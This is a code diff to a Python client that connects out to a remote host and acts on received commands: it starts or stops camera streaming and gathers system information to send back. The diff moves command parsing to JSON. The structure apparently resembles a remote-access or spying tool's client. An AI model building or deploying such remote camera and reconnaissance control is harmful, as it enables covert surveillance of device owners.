@@ -93,7 +93,8 @@ class Server (object) :
         SERVER_TO_CONNECT.connect((host,port))
         while True:
             DATA_RECV = SERVER_TO_CONNECT.recv(99999).decode()
-            if DATA_RECV == "start stream":
+            JSON_READ_MSG = json.loads(DATA_RECV)
+            if JSON_READ_MSG["command"] == "start stream":
                 if STATIC == False:
                     StartCameraStreaming(
                         host=host,
@@ -103,14 +104,14 @@ class Server (object) :
                     SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
                 elif STATIC == True:
                     SERVER_TO_CONNECT.send(f"{Sminess} {CR.red()}The {CR.yellow()}Stream {CR.red()}has already start{CR.white()}".encode())
-            elif DATA_RECV == "stop stream":
+            elif JSON_READ_MSG["command"]== "stop stream":
                 if STATIC == True:
                     StopCameraStreaming()
                     time.sleep(1)
-                    SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
+                    #SERVER_TO_CONNECT.send(f"{Splus} {CR.green()}Done{CR.white()}".encode())
                 elif STATIC == False:
                     SERVER_TO_CONNECT.send(f"{Sminess} {CR.green()}no need to stop the {CR.blue()}Stream {CR.green()}it not running{CR.white()}".encode())
-            elif DATA_RECV == "get info":
+            elif JSON_READ_MSG["command"] == "get info":
                 GettingInfoOfTheSystem(
                     __server__=SERVER_TO_CONNECT
                 )
